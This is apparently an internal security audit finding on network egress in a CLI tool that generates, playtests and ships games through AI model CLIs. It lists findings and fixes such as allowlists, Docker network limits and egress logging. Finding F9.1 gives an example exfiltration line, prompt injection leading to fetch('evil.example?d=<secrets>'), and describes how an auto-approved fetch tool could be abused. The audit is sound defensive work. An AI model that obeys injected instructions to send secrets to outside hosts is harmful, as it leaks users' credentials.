# SEC #9 — Network Egress (P1)

Scope: network traffic during `gf generate`, `gf playtest`, `gf ship`.

## Threat Model

Three distinct egress contexts:
1. **Generation**: CLI subprocess talks to Anthropic/OpenAI/Google API endpoints. Also, tool-use (`--yolo`) can `fetch` arbitrary URLs.
2. **Playtest**: headless Chromium loads the generated HTML which can talk to any origin.
3. **Ship**: `gh` to github.com, `vercel` to vercel.com.

## Findings

### F9.1 Tool-use `fetch` has no allowlist — P0 (also covered SEC #3 F3.4)
- Evidence: `cliContentGenerator.ts:140` — `spawn` inherits no egress restriction. Inside the CLI, `--yolo` auto-approves `WebFetch`/`Fetch` tools. Any URL is reachable.
- Attack: exfil vector (prompt-injection → fetch('evil.example?d=<secrets>')).
- Fix: macOS `pf` per-PID rule, or run inside Docker with `--network` restricted to provider CIDRs; or proxy via `mitmproxy` with allowlist.

### F9.2 Playtest Chromium has full egress — P1
- Evidence: `playtest.mjs:27` — `chromium.launch({headless:true})`. Default browser context allows any outbound fetch.
- Fix: `context.route('**', (route) => allowlist.has(new URL(route.request().url()).hostname) ? route.continue() : route.abort())`.

### F9.3 No egress logging — can't detect exfil after the fact — P1
- Fix: log all outbound HTTP(S) during generate+playtest into `games/<name>/egress.log`; include in ship-review diff.

### F9.4 `gh` and `vercel` inherit host net access — P2
- Expected; hard to restrict without breaking functionality. Acceptable risk because we trust these binaries.

## Severity Summary

| ID | Finding | Severity |
|---|---|---|
| F9.1 | Tool-use unbounded egress | P0 |
| F9.2 | Playtest unbounded egress | P1 |
| F9.3 | No egress logging | P1 |
| F9.4 | Ship-path egress | P2 |

## Mitigations

1. Run `opengame` inside Docker `--network gamefactory-llm` that only routes to provider endpoints.
2. Playwright route handler with allowlist.
3. `tcpdump`-lite logging for both.

Effort: 1 day.
